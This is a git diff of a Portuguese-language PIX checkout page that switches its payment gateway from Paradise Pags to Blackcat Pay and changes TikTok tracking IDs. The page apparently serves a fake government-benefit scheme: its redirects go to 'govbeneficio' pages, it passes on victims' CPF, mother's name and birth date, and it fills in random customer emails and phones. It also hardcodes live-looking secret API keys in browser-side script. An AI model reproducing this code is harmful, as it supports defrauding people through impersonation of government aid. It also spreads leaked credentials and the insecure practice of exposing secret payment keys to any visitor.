@@ -6,14 +6,14 @@
   w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
 var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
 ;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
-  ttq.load('D6ROQ3BC77UA8MCFBSDG');
+  ttq.load('D6TCRGJC77UEODBH524G');
   ttq.page();
 }(window, document, 'ttq');
 </script>
 <!-- TikTok Pixel Code End -->
 
 <script>
-  window.tikTokPixelId = "69b78d959dcfda60eb53f101";
+  window.tikTokPixelId = "19cebd8877cbf1cb62fe26d1297b78272d4621f0";
   var a = document.createElement("script");
   a.setAttribute("async",""); a.setAttribute("defer","");
   a.setAttribute("src","https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
@@ -181,15 +181,15 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 <script src="js/main.js"></script>
 <script>
 // =====================================================
-// CONFIGURAÇÃO — PARADISE PAGS
+// CONFIGURAÇÃO — BLACKCAT PAY
 // =====================================================
-var PARADISE_API_KEY  = 'sk_220715873acbf9718fdd92d1d08b541320f5c7c711b5017be8cb91edc9192bdf'; // ← cole sua sk_ aqui
-var PARADISE_ENDPOINT = 'https://multi.paradisepags.com';
+var BLACKCAT_API_URL = 'https://api.blackcatpay.com.br/api';
+var BLACKCAT_API_KEY = 'sk_live_61ab2d43146721659324096a00d68c11f784242367a8469dae090c9ddf0c07d8';
 
 var redirectUrls = {
-    6187: 'https://govbeneficio.vercel.app/up5.html',
+    1320: 'https://govbeneficio.vercel.app/up5.html',
     3582: 'https://govbeneficio.vercel.app/up5.html',
-    2790: 'https://govbeneficio.vercel.app/up5.html',
+    2790: 'https://govbeneficio.vercel.app/up4.html',
     1320: 'https://govbeneficio.vercel.app/up5.html',
     8500: 'https://govbeneficio.vercel.app/up5.html',
     4560: 'https://govbeneficio.vercel.app/up5.html',
@@ -199,14 +199,14 @@ var redirectUrls = {
 var DEFAULT_REDIRECT = 'https://govbeneficio.vercel.app/up5.html';
 // =====================================================
 
-var _txid          = null;   // transaction_id numérico da Paradise
+var _txid          = null;
 var _pixCode       = '';
 var _pixQrCode     = '';
 var _pollingTimer  = null;
 var _expiryTimer   = null;
 var _paymentAmount = 8500;
 var _customerData  = {};
-var STORAGE_KEY    = 'paradise_pix_tx3'; // chave única — não conflita com os outros checkouts
+var STORAGE_KEY    = 'blackcat_pix_tx3';
 
 function getP(key) {
     var p = new URLSearchParams(window.location.search);
@@ -225,9 +225,6 @@ function randomEmail(cpf) {
 function randomPhone() {
     var ddds = ['11','21','31','41','47','48','51','61','71','81','85'];
     return ddds[Math.floor(Math.random()*ddds.length)] + (Math.floor(10000000+Math.random()*90000000));
-}
-function gerarReference() {
-    return 'GOV-'+Date.now()+'-'+Math.floor(Math.random()*9999);
 }
 
 function saveTx(data) { try { localStorage.setItem(STORAGE_KEY, JSON.stringify(data)); } catch(e){} }
@@ -358,38 +355,37 @@ function redirectAfterPayment() {
     var base = redirectUrls[_paymentAmount] || DEFAULT_REDIRECT;
     var url  = new URL(base);
     var cur  = new URLSearchParams(window.location.search);
-    // Repassa TUDO: nome, cpf, mae, nascimento, utms, etc.
     cur.forEach(function(value, key) { url.searchParams.set(key, value); });
     console.log('Redirecionando para:', url.toString());
     setTimeout(function(){ window.location.href = url.toString(); }, 2000);
 }
 
 // =====================================================
-// POLLING — PARADISE PAGS
-// GET /api/v1/query.php?action=get_transaction&id={transaction_id}
-// Status aprovado: "approved"
+// POLLING — BLACKCAT PAY
+// GET /sales/{transactionId}/status
+// Status aprovado: "PAID"
 // =====================================================
 function startPolling() {
     if (!_txid) return;
-    console.log('Polling Paradise para transaction_id:', _txid);
+    console.log('Polling Blackcat para transactionId:', _txid);
     var attempts = 0;
     _pollingTimer = setInterval(async function() {
         attempts++;
         if (attempts > 180) { clearInterval(_pollingTimer); return; }
         try {
             var r = await fetch(
-                PARADISE_ENDPOINT + '/api/v1/query.php?action=get_transaction&id=' + _txid,
-                { headers: { 'X-API-Key': PARADISE_API_KEY } }
+                BLACKCAT_API_URL + '/sales/' + encodeURIComponent(_txid) + '/status',
+                { headers: { 'X-API-Key': BLACKCAT_API_KEY } }
             );
             var s = await r.json();
-            console.log('Polling tentativa ' + attempts + ':', s.status);
+            console.log('Polling tentativa ' + attempts + ':', s.data && s.data.status);
 
-            if (s.status === 'approved') {
+            if (s.success && s.data && s.data.status === 'PAID') {
                 clearInterval(_pollingTimer);
                 clearTx();
                 setStatus('paid', '<div class="status-icon">✅</div><div class="status-text">Pagamento confirmado!</div>');
                 redirectAfterPayment();
-            } else if (['failed','refunded','chargeback'].includes(s.status)) {
+            } else if (s.success && s.data && ['CANCELLED','REFUNDED'].includes(s.data.status)) {
                 clearInterval(_pollingTimer);
                 clearTx();
                 setStatus('error', '<div class="status-icon">❌</div><div class="status-text">Pagamento cancelado ou expirado.</div>');
@@ -399,8 +395,8 @@ function startPolling() {
 }
 
 // =====================================================
-// CRIA PIX — PARADISE PAGS
-// POST /api/v1/transaction.php  |  Auth: X-API-Key
+// CRIA PIX — BLACKCAT PAY
+// POST /sales/create-sale  |  Auth: X-API-Key
 // =====================================================
 async function createPix() {
     var nome     = getP('nome') || getP('name') || '';
@@ -418,47 +414,65 @@ async function createPix() {
     _customerData  = { nome: nome, documento: cpf, email: email, telefone: telefone };
 
     var payload = {
-        amount:      valor,
-        description: 'Pagamento Aprovado.',
-        reference:   gerarReference(),
-        source:      'api_externa',
+        amount:        valor,
+        currency:      'BRL',
+        paymentMethod: 'pix',
+        items: [
+            {
+                title:     'Pagamento Aprovado.',
+                unitPrice: valor,
+                quantity:  1,
+                tangible:  false
+            }
+        ],
         customer: {
-            name:     nomeEnvio,
-            email:    email,
-            phone:    telefone,
-            document: cpf
+            name:  nomeEnvio,
+            email: email,
+            phone: telefone,
+            document: {
+                number: cpf,
+                type:   'cpf'
+            }
         },
-        tracking: {
-            utm_source:   getP('utm_source'),
-            utm_medium:   getP('utm_medium'),
-            utm_campaign: getP('utm_campaign'),
-            utm_content:  getP('utm_content'),
-            utm_term:     getP('utm_term'),
-            src:          getP('src'),
-            sck:          getP('sck')
+        pix: {
+            expiresInDays: 1
         }
     };
-    console.log('Paradise payload:', JSON.stringify(payload));
 
-    var res = await fetch(PARADISE_ENDPOINT + '/api/v1/transaction.php', {
+    // Adiciona UTMs ao payload apenas se existirem
+    var utmSource   = getP('utm_source');
+    var utmMedium   = getP('utm_medium');
+    var utmCampaign = getP('utm_campaign');
+    var utmContent  = getP('utm_content');
+    var utmTerm     = getP('utm_term');
+    if (utmSource)   payload.utm_source   = utmSource;
+    if (utmMedium)   payload.utm_medium   = utmMedium;
+    if (utmCampaign) payload.utm_campaign = utmCampaign;
+    if (utmContent)  payload.utm_content  = utmContent;
+    if (utmTerm)     payload.utm_term     = utmTerm;
+
+    console.log('Blackcat payload:', JSON.stringify(payload));
+
+    var res = await fetch(BLACKCAT_API_URL + '/sales/create-sale', {
         method:  'POST',
-        headers: { 'Content-Type': 'application/json', 'X-API-Key': PARADISE_API_KEY },
+        headers: { 'Content-Type': 'application/json', 'X-API-Key': BLACKCAT_API_KEY },
         body:    JSON.stringify(payload)
     });
     var data = await res.json();
-    console.log('Paradise resposta:', JSON.stringify(data));
+    console.log('Blackcat resposta:', JSON.stringify(data));
 
-    if (!res.ok || data.status !== 'success') throw new Error('Erro ' + res.status + ': ' + JSON.stringify(data));
-    if (!data.qr_code) throw new Error('PIX não gerado: ' + JSON.stringify(data));
+    if (!res.ok || !data.success || !data.data || !data.data.paymentData || !data.data.paymentData.copyPaste) {
+        throw new Error('Erro ' + res.status + ': ' + (data.message || JSON.stringify(data)));
+    }
 
-    _txid      = data.transaction_id; // ID numérico para polling
-    _pixCode   = data.qr_code;
-    _pixQrCode = data.qr_code_base64 || '';
+    _txid      = data.data.transactionId;
+    _pixCode   = data.data.paymentData.copyPaste;
+    _pixQrCode = data.data.paymentData.qrCodeBase64 || '';
 
     saveTx({
         txid: _txid, pixCode: _pixCode, pixQrCode: _pixQrCode,
         amount: _paymentAmount, customer: _customerData,
-        expiry: Date.now() + 600000
+        expiry: Date.now() + 86400000
     });
 
     return data;
@@ -492,7 +506,7 @@ async function initCheckout() {
     try {
         await createPix();
         renderPix();
-        startExpiryTimer(Date.now() + 600000);
+        startExpiryTimer(Date.now() + 86400000);
         startPolling();
     } catch(err) {
         console.error('Erro ao criar PIX:', err);
